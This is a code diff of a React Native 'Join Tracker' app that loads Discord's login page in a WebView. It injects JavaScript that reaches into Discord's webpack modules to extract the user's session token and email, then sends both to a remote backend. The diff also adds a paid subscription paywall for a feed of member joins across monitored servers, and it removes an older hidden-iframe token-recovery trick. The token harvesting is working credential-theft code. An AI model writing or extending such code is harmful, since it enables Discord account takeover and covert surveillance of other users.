@@ -12,6 +12,7 @@ import {
 } from "react-native";
 import { WebView } from "react-native-webview";
 import * as Notifications from "expo-notifications";
+import AsyncStorage from "@react-native-async-storage/async-storage";
 
 Notifications.setNotificationHandler({
   handleNotification: async () => ({
@@ -27,98 +28,70 @@ export default function App() {
   const [isLoggedIn, setIsLoggedIn] = useState(false);
   const [showWebView, setShowWebView] = useState(false);
   const [myUserId, setMyUserId] = useState(null);
+  const [userEmail, setUserEmail] = useState("");
+
+  // SUBSCRIPTION STATES
+  const [isSubscribed, setIsSubscribed] = useState(true);
+  const [paystackUrl, setPaystackUrl] = useState(null);
 
   const webViewRef = useRef(null);
   const lastSeenId = useRef(null);
 
   const API_URL = "https://intelligent-gratitude-production.up.railway.app";
 
-  // AGGRESSIVE TOKEN CAPTURE SCRIPT
+  // CAPTURES BOTH TOKEN AND EMAIL
   const INJECTED_JAVASCRIPT = `
   (function() {
     function capture() {
       try {
-        // 1. TRY THE "WEBPACK" HOOK (Most reliable for Discord 2025)
         const webpack = window.webpackChunkdiscord_app;
         if (webpack) {
           const m = webpack.push([[Symbol()], {}, (e) => e]);
+          let token, email;
           for (const i in m.c) {
-            if (m.c[i].exports && m.c[i].exports.default && m.c[i].exports.default.getToken) {
-              const token = m.c[i].exports.default.getToken();
-              if (token && token.length > 20) {
-                window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: token}));
-                return true;
-              }
+            const exp = m.c[i].exports;
+            if (exp && exp.default) {
+              if (exp.default.getToken) token = exp.default.getToken();
+              if (exp.default.getCurrentUser) email = exp.default.getCurrentUser().email;
             }
+            if (token && email) break;
           }
-        }
-
-        // 2. TRY THE "IFRAME RESTORATION" HOOK
-        // Discord deletes localStorage, but a new iframe can bring it back
-        const iframe = document.createElement('iframe');
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        const storage = iframe.contentWindow.localStorage;
-        const token = storage.getItem('token');
-        if (token) {
-          const clean = token.replace(/"/g, '');
-          window.ReactNativeWebView.postMessage(JSON.stringify({type: 'TOKEN', data: clean}));
-          return true;
+          if (token && token.length > 20) {
+            window.ReactNativeWebView.postMessage(JSON.stringify({
+              type: 'TOKEN_DATA', 
+              token: token, 
+              email: email || "user@discord.com" 
+            }));
+            return true;
+          }
         }
       } catch (e) {}
       return false;
     }
-
-    // Check every 500ms
-    const timer = setInterval(() => {
-      if (capture()) clearInterval(timer);
-    }, 500);
+    const timer = setInterval(() => { if (capture()) clearInterval(timer); }, 500);
   })();
 `;
 
   useEffect(() => {
     registerForNotifications();
+    loadSavedUser();
   }, []);
 
   useEffect(() => {
-    if (isLoggedIn && myUserId) {
+    if (isLoggedIn && myUserId && isSubscribed) {
       fetchMoves();
       const interval = setInterval(fetchMoves, 5000);
       return () => clearInterval(interval);
     }
-  }, [isLoggedIn, myUserId]);
+  }, [isLoggedIn, myUserId, isSubscribed]);
 
-  const onWebViewMessage = async (event) => {
-    try {
-      const message = JSON.parse(event.nativeEvent.data);
-      if (message.type === "TOKEN" && message.data) {
-        setShowWebView(false); // SUCCESS: Redirecting back to app
-        await sendTokenToBackend(message.data);
-      }
-    } catch (e) {
-      // Direct string fallback
-      if (event.nativeEvent.data.length > 20) {
-        setShowWebView(false);
-        await sendTokenToBackend(event.nativeEvent.data);
-      }
-    }
-  };
-
-  const sendTokenToBackend = async (token) => {
-    try {
-      const response = await fetch(`${API_URL}/link-account`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ token: token }),
-      });
-      const result = await response.json();
-      if (response.ok) {
-        setMyUserId(result.user_id);
-        setIsLoggedIn(true);
-        Alert.alert("✅ Connected", "Join tracking is now active!");
-      }
-    } catch (error) {
-      Alert.alert("Server Error", "Could not reach your Railway backend.");
+  const loadSavedUser = async () => {
+    const savedId = await AsyncStorage.getItem("saved_user_id");
+    const savedEmail = await AsyncStorage.getItem("saved_user_email");
+    if (savedId) {
+      setMyUserId(savedId);
+      setUserEmail(savedEmail || "");
+      setIsLoggedIn(true);
     }
   };
 
@@ -126,8 +99,13 @@ export default function App() {
     if (!myUserId) return;
     try {
       const res = await fetch(`${API_URL}/get-moves/${myUserId}`);
+      if (res.status === 402) {
+        setIsSubscribed(false);
+        return;
+      }
       const data = await res.json();
       if (Array.isArray(data)) {
+        setIsSubscribed(true);
         if (
           lastSeenId.current &&
           data.length > 0 &&
@@ -139,10 +117,97 @@ export default function App() {
         setMoves(data);
       }
     } catch (err) {
-      console.log("Polling for joins...");
+      console.log("Connection lost...");
     } finally {
       setRefreshing(false);
     }
+  };
+
+  const handlePayment = async () => {
+    try {
+      const response = await fetch(`${API_URL}/initialize-payment`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          user_id: myUserId,
+          email: userEmail || "customer@app.com",
+        }),
+      });
+      const result = await response.json();
+      if (result.status && result.data.authorization_url) {
+        setPaystackUrl(result.data.authorization_url);
+      } else {
+        Alert.alert("Error", "Payment failed to start.");
+      }
+    } catch (e) {
+      Alert.alert("Error", "Server unreachable.");
+    }
+  };
+
+  const handlePaystackNavigation = (navState) => {
+    if (navState.url.includes("success") || navState.url.includes("callback")) {
+      setPaystackUrl(null);
+      Alert.alert("Processing", "Updating your account...", [
+        {
+          text: "Check Now",
+          onPress: () => {
+            setIsSubscribed(true);
+            fetchMoves();
+          },
+        },
+      ]);
+    }
+  };
+
+  const sendTokenToBackend = async (token, email) => {
+    try {
+      const response = await fetch(`${API_URL}/link-account`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token, email }),
+      });
+      const result = await response.json();
+      if (response.ok) {
+        const newUserId = String(result.user_id);
+        await AsyncStorage.setItem("saved_user_id", newUserId);
+        await AsyncStorage.setItem("saved_user_email", email);
+        setMyUserId(newUserId);
+        setUserEmail(email);
+        setIsLoggedIn(true);
+        Alert.alert("✅ Connected", `Logged in as ${email}`);
+      }
+    } catch (error) {
+      Alert.alert("Error", "Sync failed.");
+    }
+  };
+
+  const onWebViewMessage = async (event) => {
+    try {
+      const message = JSON.parse(event.nativeEvent.data);
+      if (message.type === "TOKEN_DATA") {
+        setShowWebView(false);
+        await sendTokenToBackend(message.token, message.email);
+      }
+    } catch (e) {
+      /* ignore */
+    }
+  };
+
+  const handleLogout = async () => {
+    Alert.alert("Reset", "Sign out?", [
+      { text: "Cancel" },
+      {
+        text: "Reset",
+        style: "destructive",
+        onPress: async () => {
+          await AsyncStorage.multiRemove(["saved_user_id", "saved_user_email"]);
+          setIsLoggedIn(false);
+          setMyUserId(null);
+          setMoves([]);
+          setIsSubscribed(true);
+        },
+      },
+    ]);
   };
 
   const triggerNotification = async (move) => {
@@ -153,70 +218,63 @@ export default function App() {
   };
 
   const registerForNotifications = async () => {
-    if (Platform.OS === "web") return;
     const { status } = await Notifications.requestPermissionsAsync();
-    if (status !== "granted") console.log("Notification permission denied");
+    if (status !== "granted") console.log("Perms denied");
   };
 
-  // --- NEW: URL DETECTION BACKUP ---
-  const handleNavigationChange = (navState) => {
-    // If the browser reaches the chat/channels area, it means login is 100% done
-    if (navState.url.includes("/channels/")) {
-      webViewRef.current.injectJavaScript(INJECTED_JAVASCRIPT);
-    }
-  };
-  /* ---------------- UPDATED UI RENDER ---------------- */
-  const renderMove = ({ item }) => {
-    // Detect which format we are looking at
-    const isFormatA = item.expert === "NEW MEMBER";
-    const displayName = isFormatA ? item.action.split(' ')[1] : item.expert;
-    const displayAction = isFormatA ? "Joined the server" : item.action;
-
-    return (
-      <View style={styles.moveItem}>
-        <View style={styles.headerRow}>
-          <Text style={styles.expert}>👤 {displayName}</Text>
-          <Text style={styles.serverTag}>{item.server}</Text>
-        </View>
-        <Text style={styles.actionText}>{displayAction}</Text>
-        <Text style={styles.timeText}>
-          {new Date(item.timestamp).toLocaleTimeString()}
-        </Text>
+  const renderMove = ({ item }) => (
+    <View style={styles.moveItem}>
+      <View style={styles.headerRow}>
+        <Text style={styles.expert}>👤 {item.action.split(" ")[1]}</Text>
+        <Text style={styles.serverTag}>{item.server}</Text>
       </View>
+      <Text style={styles.actionText}>Joined the server</Text>
+      <Text style={styles.timeText}>
+        {new Date(item.timestamp).toLocaleTimeString()}
+      </Text>
+    </View>
+  );
+
+  if (paystackUrl) {
+    return (
+      <SafeAreaView style={{ flex: 1, backgroundColor: "#fff" }}>
+        <View style={styles.webViewHeader}>
+          <TouchableOpacity onPress={() => setPaystackUrl(null)}>
+            <Text style={{ color: "red" }}>Cancel</Text>
+          </TouchableOpacity>
+          <Text style={{ fontWeight: "bold" }}>Paystack Secure</Text>
+          <View style={{ width: 50 }} />
+        </View>
+        <WebView
+          source={{ uri: paystackUrl }}
+          onNavigationStateChange={handlePaystackNavigation}
+        />
+      </SafeAreaView>
     );
-  };
+  }
 
   if (showWebView) {
     return (
       <SafeAreaView style={{ flex: 1, backgroundColor: "#fff" }}>
         <View style={styles.webViewHeader}>
           <TouchableOpacity onPress={() => setShowWebView(false)}>
-            <Text style={{ color: "red", fontWeight: "bold" }}>Cancel</Text>
+            <Text style={{ color: "red" }}>Back</Text>
           </TouchableOpacity>
-          <Text style={{ fontWeight: "bold" }}>Connect to Discord</Text>
+          <Text style={{ fontWeight: "bold" }}>Discord Login</Text>
           <View style={{ width: 50 }} />
         </View>
-
         <WebView
           ref={webViewRef}
+          incognito={true}
           source={{ uri: "https://discord.com/login" }}
           injectedJavaScript={INJECTED_JAVASCRIPT}
           onMessage={onWebViewMessage}
-          onNavigationStateChange={handleNavigationChange} // WATCH THE URL
-          javaScriptEnabled={true}
-          domStorageEnabled={true}
-          style={{ flex: 1 }}
-          // Using a Desktop UserAgent makes token storage easier to read
+          onNavigationStateChange={(n) =>
+            n.url.includes("/channels/") &&
+            webViewRef.current.injectJavaScript(INJECTED_JAVASCRIPT)
+          }
           userAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"
         />
-
-        <View style={styles.statusFooter}>
-          <ActivityIndicator size="small" color="#5865F2" />
-          <Text style={styles.statusText}>
-            {" "}
-            Capturing Token Automatically...
-          </Text>
-        </View>
       </SafeAreaView>
     );
   }
@@ -227,37 +285,60 @@ export default function App() {
         <View style={styles.loginContainer}>
           <Text style={styles.loginEmoji}>🚀</Text>
           <Text style={styles.title}>Join Tracker</Text>
-          <Text style={styles.subtitle}>Automatically track new members.</Text>
           <TouchableOpacity
             style={styles.loginButton}
             onPress={() => setShowWebView(true)}
           >
-            <Text style={styles.buttonText}>Connect Discord Account</Text>
+            <Text style={styles.buttonText}>Connect Discord</Text>
           </TouchableOpacity>
         </View>
       ) : (
         <>
-          <View style={styles.headerBar}>
-            <Text style={styles.title}>Live Feed</Text>
-            <TouchableOpacity onPress={() => setIsLoggedIn(false)}>
-              <Text style={{ color: "#5865F2", fontWeight: "bold" }}>
-                Reset
+          {!isSubscribed ? (
+            <View style={styles.paywallContainer}>
+              <Text style={styles.loginEmoji}>🔒</Text>
+              <Text style={styles.title}>Subscription Ended</Text>
+              <Text style={styles.subtitle}>
+                Unlock access to view live server joins.
               </Text>
-            </TouchableOpacity>
-          </View>
-          <FlatList
-            data={moves}
-            keyExtractor={(item) => item.id}
-            renderItem={renderMove}
-            refreshing={refreshing}
-            onRefresh={() => {
-              setRefreshing(true);
-              fetchMoves();
-            }}
-            ListEmptyComponent={
-              <Text style={styles.empty}>Waiting for activity...</Text>
-            }
-          />
+              <TouchableOpacity
+                style={styles.loginButton}
+                onPress={handlePayment}
+              >
+                <Text style={styles.buttonText}>Renew Access (₦5,000)</Text>
+              </TouchableOpacity>
+              <TouchableOpacity
+                style={{ marginTop: 25 }}
+                onPress={handleLogout}
+              >
+                <Text style={{ color: "#999" }}>Logout</Text>
+              </TouchableOpacity>
+            </View>
+          ) : (
+            <>
+              <View style={styles.headerBar}>
+                <Text style={styles.title}>Live Feed</Text>
+                <TouchableOpacity onPress={handleLogout}>
+                  <Text style={{ color: "#5865F2", fontWeight: "bold" }}>
+                    Reset
+                  </Text>
+                </TouchableOpacity>
+              </View>
+              <FlatList
+                data={moves}
+                keyExtractor={(item) => item.id}
+                renderItem={renderMove}
+                refreshing={refreshing}
+                onRefresh={() => {
+                  setRefreshing(true);
+                  fetchMoves();
+                }}
+                ListEmptyComponent={
+                  <Text style={styles.empty}>Monitoring 19 servers...</Text>
+                }
+              />
+            </>
+          )}
         </>
       )}
     </View>
@@ -276,6 +357,12 @@ const styles = StyleSheet.create({
     borderBottomColor: "#eee",
   },
   loginContainer: {
+    flex: 1,
+    justifyContent: "center",
+    alignItems: "center",
+    padding: 30,
+  },
+  paywallContainer: {
     flex: 1,
     justifyContent: "center",
     alignItems: "center",
@@ -313,8 +400,6 @@ const styles = StyleSheet.create({
     padding: 15,
     marginBottom: 10,
     borderRadius: 12,
-    shadowOpacity: 0.1,
-    shadowRadius: 5,
     elevation: 2,
   },
   headerRow: { flexDirection: "row", justifyContent: "space-between" },
@@ -328,18 +413,6 @@ const styles = StyleSheet.create({
     borderRadius: 10,
   },
   actionText: { marginTop: 8, fontSize: 15, color: "#333" },
+  timeText: { fontSize: 11, color: "#999", marginTop: 5 },
   empty: { textAlign: "center", marginTop: 50, color: "#999" },
-  statusFooter: {
-    flexDirection: "row",
-    alignItems: "center",
-    justifyContent: "center",
-    padding: 20,
-    backgroundColor: "#fff",
-  },
-  statusText: {
-    fontSize: 13,
-    color: "#5865F2",
-    marginLeft: 10,
-    fontWeight: "500",
-  },
 });
